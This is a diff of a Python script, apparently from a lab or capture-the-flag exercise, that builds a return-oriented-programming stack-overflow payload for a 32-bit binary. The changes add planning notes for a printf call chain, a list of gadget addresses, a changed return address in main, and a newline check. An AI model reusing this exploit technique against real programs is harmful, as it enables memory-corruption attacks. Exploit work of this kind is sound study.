@@ -15,7 +15,39 @@ stdout.write("Six factorial is %d.      \x00\n")  # To be read into `plaintext`
 # ]
 """
 We can use 125 to a register value if we can put 
-4 pops in one ROP. prop number, plaintex, ROP with 3 pops, and printf address
+4 push in one ROP. prop number, plaintex, ROP with 3 pops, and printf address
+Before:
+reg1: value for printing
+pop reg2
+&format_string
+pop reg3
+&rop with 4 pops
+pop reg4
+&printf
+rop with push reg1; push reg2; push reg3; push reg4; ret
+&exit
+
+After: the push rop
+&printf
+&rop with 3 pops
+&format
+val
+rop with push reg1; push reg2; push reg3; push reg4; ret
+&exit
+
+
+Or we can do 
+push reg 1; sub esp 0x4
+
+and then
+
+add esp 0x12
+
+ROPS
+0x0806098b: add esp, 4; pop ebx; pop esi; pop edi; pop ebp; ret; 
+0x0804af56: add esp, 4; pop ebx; pop esi; ret; 
+0x08066da2: add esp, 0xc; ret; 
+
 """
 
 # Print the value of GLB using main.
@@ -31,7 +63,8 @@ payload = [0x00000000] * 6 + [
     0x80e5000,  # $ebx at start of concatenate strings
     0x08049859,  # pop ebp; ret;
     0xffffd018,  # original ebp
-    0x8049eb7,  # the return address in main
+    0x08049eed,  # the return address in main
+    # 0x8049eb7,  # the return address in main
     # 0x08049efc,  # the address before the final call to printf in main
 ]
 
@@ -45,6 +78,8 @@ for word in payload:
     assert (word >> 32) == 0  # 4 byte address
     for j in range(4):
         byte = word & byte_mask
+        if byte == ord("\n"):
+            stderr("Cannot write 0x0a to the stack (i.e. a newline), change valu number ", i)
         if not (i == len(payload) - 1 and j == 3):
             stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x00\x00\x00")
         else:
